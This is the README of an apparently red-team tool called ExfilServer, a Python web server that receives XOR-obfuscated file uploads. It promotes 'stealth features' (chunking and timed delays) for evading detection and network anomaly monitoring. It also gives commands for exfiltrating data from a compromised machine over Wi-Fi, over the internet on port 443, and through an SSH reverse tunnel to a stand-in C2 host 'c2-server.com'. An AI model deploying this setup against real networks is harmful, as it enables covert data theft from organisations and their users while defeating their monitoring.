<div align="center">
  <img src="logo.png" alt="ExfilServer Logo" width="200">
</div>

# ExfilServer
Client-side Encrypted Upload Server Python Script

## Overview

ExfilServer is a secure file upload server that provides client-side encryption and automatic upload functionality. It features a modern web interface with drag-and-drop support, real-time file status indicators, and XOR-based encryption for file obfuscation during transmission.

<div align="center">
  <img src="example.png" alt="ExfilServer Web Interface" width="600">
  <br>
  <em>ExfilServer Web Interface - Drag & Drop File Upload with Encryption</em>
</div>

## Features

### Security
- **Client-side Encryption**: Files are encrypted in the browser before transmission
- **Server-side Decryption**: Automatic decryption using server-specified keys
- **Key-based Access Control**: Only files encrypted with matching keys are processed
- **XOR Encryption**: Fast, lightweight encryption for file obfuscation

### User Experience
- **Drag & Drop Interface**: Automatic upload when files are dropped
- **Real-time Status**: Visual indicators for encryption, upload, and completion states
- **Multiple File Support**: Upload multiple files simultaneously
- **Modern UI**: Clean, responsive design with visual feedback
- **Password Protection**: User-specified encryption keys for enhanced security

### Technical Features
- **Command-line Configuration**: Server key and port specification via arguments
- **Automatic File Processing**: Seamless encryption → upload → decryption workflow
- **Error Handling**: Comprehensive error reporting and validation
- **Cross-platform**: Works on any system with Python 3

## Stealth Features

### File Chunking
- **Configurable Chunking**: Split files into 1-1000 chunks for covert transfer
- **Automatic Reassembly**: Server automatically reconstructs files from received chunks
- **Traffic Obfuscation**: Large files appear as multiple small transfers
- **Evasion Capability**: Bypass file size restrictions and detection systems

### Chunk Upload Delays
- **Configurable Delays**: Set delays between chunk uploads (0-10,000ms)
- **Traffic Shaping**: Control upload rate to avoid network anomaly detection
- **Stealth Timing**: Mimic normal user behavior with realistic upload patterns
- **Load Distribution**: Spread transfers over time to reduce server load spikes

### Operational Benefits
- **Detection Avoidance**: Chunked transfers with delays appear as normal web traffic
- **Network Resilience**: Failed chunks can be retransmitted without restarting entire upload
- **Bandwidth Management**: Control network utilization to maintain operational security
- **Covert Channels**: Establish low-profile data exfiltration channels

## Installation

1. Clone the repository:
```bash
git clone https://github.com/vysecurity/ExfilServer.git
cd ExfilServer
```

2. No additional dependencies required - uses only Python standard library

## Usage

### Starting the Server

```bash
# Basic usage with required server key
python3 upload_server.py --key "YourServerKey123"

# Custom port and key
python3 upload_server.py --key "SecureKey456" --port 9000
```

### Command Line Arguments

- `--key` (required): Server decryption key for processing uploaded files
- `--port` (optional): Port to run the server on (default: 8000)

### Web Interface

1. Open your browser and navigate to `http://localhost:8000`
2. Enter an encryption key in the password field
3. **Configure stealth options** (optional):
   - Set "Number of Chunks" (1-1000) to split files for covert transfer
   - Set "Delay Between Chunks" (0-10,000ms) to control upload timing
4. Either:
   - Click "Select files" to choose files manually, then click "Upload"
   - Drag and drop files directly into the drop area for automatic upload

### File Processing Flow

1. **Client**: User enters encryption key and selects/drops files
2. **Chunking**: Files are optionally split into specified number of chunks
3. **Encryption**: Files/chunks are encrypted in the browser using XOR cipher
4. **Upload**: Encrypted files/chunks are transmitted with optional delays
5. **Reassembly**: Server automatically reconstructs chunked files
6. **Decryption**: Server decrypts files using the specified server key
7. **Storage**: Decrypted files are saved with original filenames

## Security Model

### Encryption Process
- **Client-side**: User-specified key encrypts files before transmission
- **Server-side**: Administrator-specified key decrypts received files
- **Key Matching**: Files are only successfully processed when encryption/decryption keys match
- **Transport Security**: Files are obfuscated during network transmission

### Access Control
- Users must know the correct encryption key to successfully upload files
- Server administrator controls the decryption key via command line
- Failed decryption attempts are logged and rejected

## File Status Indicators

- **Ready**: File selected and ready for upload
- **Encrypting**: File is being encrypted in the browser
- **Uploading**: Encrypted file is being transmitted
- **Uploaded**: File successfully processed and saved
- **Error**: Upload or decryption failed

## Example Scenarios

### Secure File Collection
```bash
# Start server with collection key
python3 upload_server.py --key "CollectionKey2024"
```
Users must enter "CollectionKey2024" in the web interface to upload files.

### Multi-user Environment
```bash
# Different keys for different purposes
python3 upload_server.py --key "ProjectAlpha" --port 8001
python3 upload_server.py --key "ProjectBeta" --port 8002
```

## Data Exfiltration Use Cases

### 1. Data Exfiltration over Local Wi-Fi Subnet
```bash
# Start server on local network interface
python3 upload_server.py --key "WiFiExfil2024" --port 8000

# Access from any device on the same Wi-Fi network
# Navigate to: http://[SERVER_IP]:8000
# Example: http://192.168.1.100:8000
```
**Scenario**: Internal network data collection where the server runs on a compromised machine within the local subnet. Clients on the same Wi-Fi network can upload files using the shared encryption key.

### 2. Data Exfiltration over Internet
```bash
# Start server with port forwarding or public IP
python3 upload_server.py --key "RemoteExfil2024" --port 443

# Configure firewall/router for external access
# Access from anywhere: https://[PUBLIC_IP]:443
```
**Scenario**: Remote data exfiltration where the server is exposed to the internet. Requires proper network configuration (port forwarding, firewall rules) and ideally HTTPS for transport security. Useful for collecting data from remote locations.

### 3. Reverse Port Forward over C2 Channel
```bash
# On compromised target (reverse tunnel)
ssh -R 8000:localhost:8000 user@c2-server.com

# On C2 server, start ExfilServer
python3 upload_server.py --key "C2Exfil2024" --port 8000

# Access via C2 server: http://c2-server.com:8000
```
**Scenario**: Covert data exfiltration through an established C2 (Command & Control) channel. The reverse port forward creates a secure tunnel from the target network to the C2 infrastructure, allowing data collection without direct internet exposure of the target machine.

## Technical Details

### Encryption Algorithm
- **Method**: XOR cipher with key repetition
- **Performance**: Fast encryption/decryption suitable for large files
- **Security**: Provides obfuscation against casual inspection

### File Handling
- **Original Names**: Preserved through separate form fields
- **Binary Support**: Handles all file types (images, documents, executables)
- **Size Limits**: Constrained only by available memory and disk space

### Browser Compatibility
- **Modern Browsers**: Chrome, Firefox, Safari, Edge
- **JavaScript Required**: For encryption and drag-and-drop functionality
- **File API**: Uses modern browser file handling capabilities

## Security Considerations

### Production Deployment
- Consider using HTTPS for transport encryption
- Implement stronger encryption algorithms for sensitive data
- Add authentication and authorization mechanisms
- Monitor and log access attempts

### Key Management
- Use strong, unique keys for different deployments
- Rotate keys regularly
- Avoid hardcoding keys in scripts or configuration files
- Consider key derivation functions for enhanced security

## Troubleshooting

### Common Issues

**Server won't start**
- Ensure the `--key` parameter is provided
- Check if the port is already in use
- Verify Python 3 is installed

**Upload fails**
- Verify encryption key is entered in the web interface
- Check server logs for decryption errors
- Ensure sufficient disk space in uploads directory

**Files not decrypting**
- Confirm client and server keys match
- Check for special characters in keys
- Verify file wasn't corrupted during upload

## Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for bugs and feature requests.

## License

This project is open source. Please check the repository for license details.

## Author

Developed by @vysecurity for secure file collection and transfer scenarios.
